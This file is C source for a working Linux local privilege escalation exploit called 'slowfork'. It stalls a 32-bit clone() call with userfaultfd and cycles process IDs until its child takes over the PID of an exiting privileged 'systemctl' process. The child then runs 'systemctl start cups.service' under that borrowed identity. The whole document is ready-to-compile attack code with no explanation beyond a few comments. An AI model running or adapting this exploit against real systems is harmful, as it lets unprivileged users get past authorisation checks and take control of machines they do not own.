/* $ gcc -o slowfork slowfork.c -pthread -O2 */

#define _GNU_SOURCE
#include <pthread.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <err.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdio.h>
#include <sched.h>
#include <asm/ldt.h>
#include <errno.h>
#include <stdbool.h>

static int uffd;
static void *uf_mapping;
static int target_pid = -1;

static char exit_stack[0x2000];
static int exit_fn(void *dummy) {
	syscall(__NR_exit, 0);
}

static pid_t consume_pid(void) {
	pid_t loop_pid = clone(exit_fn, exit_stack+sizeof(exit_stack),
			       CLONE_FILES|CLONE_FS|CLONE_IO|
			       CLONE_SIGHAND|CLONE_SYSVSEM|
			       CLONE_VM|SIGCHLD, NULL);
	if (loop_pid == -1) return -1;
	int status;
	pid_t res = wait(&status);
	if (res != loop_pid) return -1;
	return loop_pid;
}

static pid_t consume_pids(void) {
	pid_t loop_pid;
	for (int i=0; i<10; i++) {
		loop_pid = clone(exit_fn, exit_stack+sizeof(exit_stack),
			         CLONE_FILES|CLONE_FS|CLONE_IO|
			         CLONE_SIGHAND|CLONE_SYSVSEM|
			         CLONE_VM|SIGCHLD, NULL);
		if (loop_pid == -1) return -1;
	}
	for (int i=0; i<10; i++) {
		int status;
		pid_t res = wait(&status);
		if (res == -1) return -1;
	}
	return loop_pid;
}

static pid_t last_pid_for_ns(void) {
	char buf[20];
	int fd = open("/proc/sys/kernel/ns_last_pid", O_RDONLY);
	int res = read(fd, buf, sizeof(buf)-1);
	if (res <= 0) return -1;
	close(fd);
	buf[res] = 0;
	return atoi(buf);
}

static void *continue_thread(void *dummy) {
	struct uffd_msg msg;
	int res = read(uffd, &msg, sizeof(struct uffd_msg));
	if (res != sizeof(struct uffd_msg)) return NULL;
	// printf("got uffd msg\n");
	if (msg.event != UFFD_EVENT_PAGEFAULT)  return NULL;
	if (msg.arg.pagefault.address != (unsigned long)uf_mapping)
		 return NULL;
	// printf("good pagefault\n");

	char stat_path[100];
	sprintf(stat_path, "/proc/%d/stat", target_pid);
	int s_fd = open(stat_path, O_RDONLY);
	char s_buf[1000];
	int read_res = read(s_fd, s_buf, sizeof(s_buf)-1);
	close(s_fd);
	if (read_res > 0) {
		s_buf[read_res] = 0;
		char *cs_p = s_buf;
		for (int i=1; i<22; i++) {
			cs_p = strchr(cs_p, ' ');
			if (cs_p == NULL) return NULL;
			cs_p++;
		}
		long start_time_old = strtol(cs_p, NULL, 10);
		// printf("old start time: %ld\n", start_time_old);
	}

	// printf("awaiting death of %d...\n", target_pid);
	while (1) {
		int res = kill(target_pid, 0);
		if (res == -1 && errno == ESRCH) break;

		// ensure that we're always within ~100 PIDs
		bool printed = false;
		while (1) {
			pid_t last = last_pid_for_ns();
			if (last < target_pid && last > target_pid - 100)
				break;
			if (!printed) {
				// printf("cycling...\n");
				printed = true;
			}
			consume_pids();
		}
		if (printed)
			// printf("cycling done\n");

		usleep(10000);
	}

	// printf("scanning for previous free PID\n");
	pid_t child_search_pid = target_pid - 1;
	while (1) {
		if (child_search_pid <= 2) return NULL;
		int res = kill(child_search_pid, 0);
		if (res == -1 && errno == ESRCH) break;
		child_search_pid--;
	}

	// printf("looping PID (going for %d)\n", child_search_pid);
	while (1) {
		pid_t loop_pid = consume_pid();
		if (loop_pid == child_search_pid) break;
	}

	// printf("resolving pagefault\n");
	union {
		struct user_desc data;
		char pad[0x1000];
	} ldt_desc = { .data = {
		.entry_number = 14,
		.read_exec_only = 1,
		.seg_not_present = 1
	} };
	struct uffdio_copy copy = {
		.dst = (unsigned long)uf_mapping,
		.src = (unsigned long)&ldt_desc,
		.len = 0x1000,
		.mode = 0
	};
	if (ioctl(uffd, UFFDIO_COPY, &copy)) return NULL;
	if (copy.copy != 0x1000) return NULL;
	return NULL;
}

int main(void) {
	// Documentation for userfaultfd:
	// http://man7.org/linux/man-pages/man2/userfaultfd.2.html
	// http://man7.org/linux/man-pages/man2/ioctl_userfaultfd.2.html
	// https://blog.lizzie.io/using-userfaultfd.html
	uffd = syscall(__NR_userfaultfd, 0);
	if (uffd == -1) return -1;
	struct uffdio_api api = { .api = 0xAA, .features = 0 };
	if (ioctl(uffd, UFFDIO_API, &api)) return -1;
	uf_mapping = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
			  MAP_PRIVATE|MAP_ANONYMOUS|MAP_32BIT, -1, 0);
	if (uf_mapping == MAP_FAILED) return -1;
	struct uffdio_register reg = {
		.range = {
			.start = (unsigned long)uf_mapping,
			.len = 0x1000
		},
		.mode = UFFDIO_REGISTER_MODE_MISSING
	};
	if (ioctl(uffd, UFFDIO_REGISTER, &reg)) return -1;

	pthread_t ct;
	if (pthread_create(&ct, NULL, continue_thread, NULL)) return -1;

	// Wait for the legitimate task to spawn.
	DIR *proc_dir = opendir("/proc");
	if (proc_dir == NULL) return -1;
	while (1) {
		rewinddir(proc_dir);
		struct dirent *dent;
		while ((dent = readdir(proc_dir)) != NULL) {
			if (dent->d_name[0] < '0' || dent->d_name[0] > '9')
				continue;
			char comm_path[30];
			sprintf(comm_path, "/proc/%s/comm", dent->d_name);
			char comm[20];
			int comm_fd = open(comm_path, O_RDONLY);
			if (comm_fd == -1) continue;
			ssize_t res = read(comm_fd, comm, 19);
			if (res < 0)
				comm[0] = 0;
			else
				comm[res] = 0;
			close(comm_fd);
			if (strcmp(comm, "systemctl\n") == 0) {
				target_pid = atoi(dent->d_name);
				break;
			}
		}
		if (target_pid != -1) break;
	}

	// Call clone() *through the 32-bit syscall API*.
	unsigned long clone_flags = CLONE_SETTLS | SIGCHLD;
	unsigned long tls_val = (unsigned long)uf_mapping;
	int clone_result;
	asm volatile(
		"mov $120, %%rax\n\t"
		"mov %[clone_flags], %%rbx\n\t"
		"mov $0, %%rcx\n\t" //newsp
		"mov $0, %%rdx\n\t" //parent_tidptr
		"mov %[tls_val], %%rsi\n\t"
		"mov $0, %%rdi\n\t" //child_tidptr
		"int $0x80\n\t"
		"mov %%eax, %[clone_result]\n\t"
	: // out
		[clone_result] "=m"(clone_result)
	: // in
		[clone_flags] "m"(clone_flags),
		[tls_val] "m"(tls_val)
	: // clobber
		// 32-bit entry path zeroes the 64-bit-only registers
		"r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
		// syscall args and retval
		"rax", "rcx", "rdx", "rsi", "rdi",
		// misc stuff
		"memory", "cc"
	);
	if (clone_result < 0) {
		// printf("clone result (negative): %d\n", clone_result);
		return 1;
	}
	if (clone_result == 0) {
		/*
		while (1) syscall(__NR_pause);
		*/
		char *argv[] = {
			"systemctl",
			"start",
			"cups.service",
			NULL
		};
		syscall(__NR_execve, "/bin/systemctl", argv, environ);
		syscall(__NR_exit, 1);
	}
	// printf("clone result (positive): %d\n", clone_result);

	char child_stat_path[100];
	sprintf(child_stat_path, "/proc/%d/stat", clone_result);
	int cs_fd = open(child_stat_path, O_RDONLY);
	char cs_buf[1000];
	int read_res = read(cs_fd, cs_buf, sizeof(cs_buf)-1);
	close(cs_fd);
	if (read_res > 0) {
		cs_buf[read_res] = 0;
		char *cs_p = cs_buf;
		for (int i=1; i<22; i++) {
			cs_p = strchr(cs_p, ' ');
			if (cs_p == NULL) return -1;
			cs_p++;
		}
		long start_time_new = strtol(cs_p, NULL, 10);
		// printf("new start time: %ld\n", start_time_new);
	}

	int status;
	if (wait(&status) != clone_result)
		return -1;
	// printf("child died, exiting\n");
	return 0;
}
